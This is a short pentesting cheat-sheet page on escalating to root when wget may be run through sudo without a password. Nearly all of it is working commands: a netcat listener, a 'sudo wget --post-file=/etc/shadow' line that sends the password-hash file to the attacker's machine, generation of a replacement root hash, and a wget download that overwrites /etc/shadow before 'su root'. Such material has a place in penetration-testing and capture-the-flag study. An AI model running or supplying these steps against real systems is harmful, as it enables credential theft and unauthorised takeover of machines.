---
title: Sudo Wget Privilege Escalation
description: The "sudo wget" command may be vulnerable to privilege escalation (PrivEsc).
tags:
    - Privilege Escalation
refs:
date: 2023-02-05
draft: false
---

## Investigation

```sh
sudo -l

(root) NOPASSWD: /usr/bin/wget
```

If we can execute **"wget"** as root, we may be able to escalate privileges.

<br />

## Modify /etc/shadow

Get **"/etc/shadow"** and generate a new hash passwd, then set it to the shadow file, next upload it.  
That changes the root password.

### 1. Get the Content of /etc/shadow

To see the content of /etc/shadow, we can use netcat listener.  
So First, start a listener in local machine.

```sh
nc -lvnp 4444
```

In target machine, display the contents of the **"/etc/shadow"** to the local machine using the following command.  

```sh
sudo /usr/bin/wget --post-file=/etc/shadow <local-ip> 4444
```

We should see the content in our local machine via netcat listener.  
Copy the content.

### 2. Create a New Shadow File

We create a new shadow file in local. The shadow file will be stored into the target **/etc/shadow** later.

```sh
vim shadow.txt
```

In vim editor (or nano, vi, etc.), paste the content of /etc/shadow which we've copied in the previous section.

### 3. Create a New Root User Password and Add to Shadow File

Generate a new hash password for a new root user in local machine.  

```sh
# -6: SHA512
openssl passwd -6 -salt 'salt' 'password'
```

Copy the generated password and paste it at the password of the root user into the **"shadow.txt"**.  
As a result, the contents of the **"shadow.txt"** should look like this:

```sh
root:$6$salt$IxDD...DCy.g.:18195:0:99999:7:::
...
```

### 4. Transfer the Content of the Shadow File

To put the **shadow.txt** into the target machine, start web server for hosting this file.

```sh
python3 -m http.server 8000
```

Download this file into the **/etc/shadow** in remote machine. To do that, we need to run it as root.

```sh
sudo /usr/bin/wget http://<local-ip>:8000/shadow.txt -O /etc/shadow 
```

Finally, you can switch to the root user with the password we've created.

```sh
su root
```